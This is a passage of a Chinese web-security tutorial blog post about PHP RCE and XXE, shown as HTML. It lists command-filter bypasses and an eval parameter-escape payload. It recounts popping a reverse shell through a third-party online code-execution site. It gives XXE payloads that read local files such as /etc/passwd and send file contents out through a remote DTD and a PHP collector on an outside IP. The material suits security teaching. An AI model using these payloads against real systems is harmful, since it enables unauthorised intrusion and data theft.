+<p>sh &#x2F;flag 2&gt;%261 &#x2F;&#x2F;报错出文件内容</p>
+<p>curl file:&#x2F;&#x2F;&#x2F;root&#x2F;f&#x2F;flag</p>
+<p>strings flag</p>
+<p>uniq -c flag</p>
+<p>bash -v flag</p>
+<p>rev flag</p>
+<h3 id="过滤空格"><a href="#过滤空格" class="headerlink" title="过滤空格"></a>过滤空格</h3><p>%09（url传递）(cat%09flag.php)</p>
+<p>cat${IFS}flag</p>
+<p>a&#x3D;fl;b&#x3D;ag;cat$IFS$a$b</p>
+<p>{cat,flag}</p>
+<h3 id="参数逃逸"><a href="#参数逃逸" class="headerlink" title="参数逃逸"></a>参数逃逸</h3><p><code>eval($_GET[1]);&amp;1=system(&#39;tac flag.php&#39;);</code></p>
+<h2 id="无回显怎么判断是否存在rce"><a href="#无回显怎么判断是否存在rce" class="headerlink" title="无回显怎么判断是否存在rce"></a>无回显怎么判断是否存在rce</h2><ol>
+<li>使用命令写入文件</li>
+<li>访问文件，看看是否写入</li>
+</ol>
+<h2 id="漏洞挖掘-1"><a href="#漏洞挖掘-1" class="headerlink" title="漏洞挖掘"></a>漏洞挖掘</h2><p>可以执行代码的地方，比如一些代码在线运行平台测试，这里以某个工具网为例：</p>
+<p>发现这里有python在线执行，就在棱角社区生成python的反弹shell命令，在服务器上开启5566端口的监听，输入反弹shell代码</p>
+<p><img src="/2023/10/08/Web%E6%94%BB%E9%98%B2-PHP%E5%BA%94%E7%94%A8-CSRF-SSRF-RCE-XML%E6%BC%8F%E6%B4%9E/7.png" alt="7"></p>
+<p>在服务器上发现反弹成功</p>
+<p><img src="/2023/10/08/Web%E6%94%BB%E9%98%B2-PHP%E5%BA%94%E7%94%A8-CSRF-SSRF-RCE-XML%E6%BC%8F%E6%B4%9E/8.png" alt="8"></p>
+<h1 id="XXE"><a href="#XXE" class="headerlink" title="XXE"></a>XXE</h1><h2 id="介绍-2"><a href="#介绍-2" class="headerlink" title="介绍"></a>介绍</h2><h3 id="XML"><a href="#XML" class="headerlink" title="XML"></a>XML</h3><p>XML（<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/%E5%8F%AF%E6%89%A9%E5%B1%95%E6%A0%87%E8%AE%B0%E8%AF%AD%E8%A8%80/2885849?fromModule=lemma_inlink">可扩展标记语言</a>），是一种数据表示格式，被设计为<strong>传输和存储数据</strong>，类似于JSON传输。</p>
+<p>XML和html区别：</p>
+<ul>
+<li><p>XML 被设计为传输和存储数据，其焦点是数据的内容。</p>
+</li>
+<li><p>HTML 被设计用来显示数据，其焦点是数据的外观。</p>
+</li>
+</ul>
+<p>举个例子对比下几种数据传输格式的区别：</p>
+<ul>
+<li><p>这是普通的：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=admin&amp;password=123456</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>这是xml：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;user&gt;&lt;username&gt;admin&lt;/username&gt;&lt;password&gt;123456&lt;/password&gt;&lt;/user&gt;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>这是json:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">	user&#123;</span><br><span class="line">		username : &quot;admin&quot;</span><br><span class="line">		password : &quot;123456&quot;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
+</ul>
+<h3 id="XXE-1"><a href="#XXE-1" class="headerlink" title="XXE"></a>XXE</h3><p>XXE漏洞（XML External Entity Injection），即xml外部实体注入漏洞，XXE漏洞发生在应用程序解析XML输入时，没禁止外部实体的加载，导致可加载恶意外部文件，造成文件读取、内网扫描、攻击内网等危害</p>
+<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><h3 id="有回显"><a href="#有回显" class="headerlink" title="有回显"></a>有回显</h3><p>这里用一个登录框例子来说明：</p>
+<p>输入账号admin，密码123456，抓包得</p>
+<p><img src="/2023/10/08/Web%E6%94%BB%E9%98%B2-PHP%E5%BA%94%E7%94%A8-CSRF-SSRF-RCE-XML%E6%BC%8F%E6%B4%9E/1-1700921316026-1.png" alt="1"></p>
+<p>可以发现，返回包里回显了用户名，那么我们只要在用户名的位置植入恶意代码，那么代码在解析xml里用户名的时候，就会执行恶意代码，并把代码执行结果返回。</p>
+<p>构造如下代码:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt; </span><br><span class="line">&lt;!DOCTYPE znskiw [</span><br><span class="line">&lt;!ENTITY test SYSTEM  &quot;file:///d:/1.txt&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;user&gt;&lt;username&gt;&amp;test;&lt;/username&gt;&lt;password&gt;znskiw&lt;/password&gt;&lt;/user&gt;</span><br></pre></td></tr></table></figure>
+
+<ol>
+<li><p>第一行表明该xml的版本</p>
+</li>
+<li><p>第二行定义了一个文档类型，znskiw为文档名，无义，可以被替换成任意值</p>
+</li>
+<li><p>第三行定义了一个名为 <code>test</code> 的实体，该实体引用了一个外部文件 <code>file:///d:/1.txt</code>。当 XML 解析器遇到 <code>&amp;test;</code> 这样的引用时，它会尝试替换为指定文件的内容</p>
+</li>
+<li><p>最后一行就依照原本的格式，把会被解析回显的username改成调用恶意代码</p>
+<p>结果如图：</p>
+<p><img src="/2023/10/08/Web%E6%94%BB%E9%98%B2-PHP%E5%BA%94%E7%94%A8-CSRF-SSRF-RCE-XML%E6%BC%8F%E6%B4%9E/2-1700924652659-3.png" alt="2"></p>
+</li>
+</ol>
+<h3 id="无回显"><a href="#无回显" class="headerlink" title="无回显"></a>无回显</h3><h4 id="判断是否存在漏洞"><a href="#判断是否存在漏洞" class="headerlink" title="判断是否存在漏洞"></a>判断是否存在漏洞</h4><p>使用dnslog，构造：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; ?&gt;</span><br><span class="line">&lt;!DOCTYPE znskiw [</span><br><span class="line">    &lt;!ENTITY send SYSTEM &quot;http://b2r3wh.dnslog.cn&quot;&gt;</span><br><span class="line">    %send;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;user&gt;&lt;username&gt;&amp;send;&lt;/username&gt;&lt;password&gt;123456&lt;/password&gt;&lt;/user&gt;</span><br></pre></td></tr></table></figure>
+
+<p>结果如下：</p>
+<p><img src="/2023/10/08/Web%E6%94%BB%E9%98%B2-PHP%E5%BA%94%E7%94%A8-CSRF-SSRF-RCE-XML%E6%BC%8F%E6%B4%9E/Web%E6%94%BB%E9%98%B2-PHP%E5%BA%94%E7%94%A8-CSRF3-1700925400413-5.png" alt="3"></p>
+<h4 id="任意文件读取"><a href="#任意文件读取" class="headerlink" title="任意文件读取"></a>任意文件读取</h4><p>这种方法就要先在自己的服务器里上传test.dtd，内容为</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % all &quot;&lt;!ENTITY send SYSTEM &#x27;http://81.71.103.144/get.php?file=%file;&#x27;&gt;&quot;&gt;</span><br></pre></td></tr></table></figure>
+
+<p>还要在自己的服务器里上传get.php文件，内容为</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$data=$_GET[&#x27;file&#x27;];</span><br><span class="line">$myfile = fopen(&quot;file.txt&quot;, &quot;w+&quot;);</span><br><span class="line">fwrite($myfile, $data);</span><br><span class="line">fclose($myfile);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>最后构造xxe攻击paylaod：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE ANY[</span><br><span class="line">&lt;!ENTITY % file SYSTEM &quot;file:///d:/1.txt&quot;&gt;</span><br><span class="line">&lt;!ENTITY % remote SYSTEM &quot;http://81.71.103.144/test.dtd&quot;&gt;</span><br><span class="line">%remote;</span><br><span class="line">%all;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;root&gt;&amp;send;&lt;/root&gt;</span><br></pre></td></tr></table></figure>
+
+<p>可以在自己的服务器目录下发现新建的file.txt文件，内容就是读取目标网站的文件内容</p>
+<h2 id="伪协议"><a href="#伪协议" class="headerlink" title="伪协议"></a>伪协议</h2><p>就是把恶意代码换成伪协议，具体代码格式可见</p>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/20175211lyz/p/11413335.html">https://www.cnblogs.com/20175211lyz/p/11413335.html</a></p>
+<h2 id="漏洞挖掘-2"><a href="#漏洞挖掘-2" class="headerlink" title="漏洞挖掘"></a>漏洞挖掘</h2><h4 id="黑盒"><a href="#黑盒" class="headerlink" title="黑盒"></a>黑盒</h4><p>1、获取Content-Type或数据类型为xml时，尝试进行xml语言payload进行测试</p>
+<p>2、不管获取的Content-Type类型或数据传输类型，均可尝试修改后提交测试xxe</p>
+<p>更改请求数据格式：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version = &quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE ANY [</span><br><span class="line">    &lt;!ENTITY f SYSTEM &quot;file:///etc/passwd&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;x&gt;&amp;f;&lt;/x&gt;</span><br></pre></td></tr></table></figure>
+
+<h3 id="白盒"><a href="#白盒" class="headerlink" title="白盒"></a>白盒</h3><p>1、可通过应用功能追踪代码定位审计</p>
+<p>2、可通过脚本特定函数搜索定位审计</p>
+
+                </section>
+
+                
+                
+
+                
+
+            </article>
+
+            
+            <nav class="dis_flex al_post_nav">
+                <a class="al_post_nav_item dis_flex_acenter" href="/">
+                    
+                </a>
+                <a class="al_post_nav_item dis_flex_acenter" href="/2023/09/26/Web%E6%94%BB%E9%98%B2-PHP%E5%BA%94%E7%94%A8-XSS%E8%B7%A8%E7%AB%99/">
+                    
+                        <span class="al_text_ellipsis al_post_nav_desc">Web攻防-PHP应用-XSS跨站</span>
+                        <svg class="al_arrow">
+                            <use xmlns="http://www.w3.org/2000/svg" xlink:href="/assets/svg_icons.svg#svg-arrow-right"></use>
+                        </svg>
+                    
+                </a>
+            </nav>
+        </div>
+    </div>
+
+
+        <div class="al_index_footer dis_flex_center">
+    <div class="al_index_footer_item al_index_footer_title">
+        John Doe
+    </div>
+
+    
+    
+
+    <div class="al_index_footer_item al_index_footer_extra">
+        Created By 
+        <a target="_blank" rel="noopener" href="https://github.com/iGuan7u/Acetolog">AcetoLog</a>
+         · Power By 
+        <a target="_blank" rel="noopener" href="https://hexo.io/">Hexo</a>
+    </div>
+
+    <div class="al_index_footer_item al_index_footer_extra_right">
+        All Right Reserved
+    </div>
+</div>
+
+        <script type="text/javascript" async="async" src="/javascripts/acelog.js"></script>
+        
+        
+        
+        
+        
+
+    </body>
+</html>
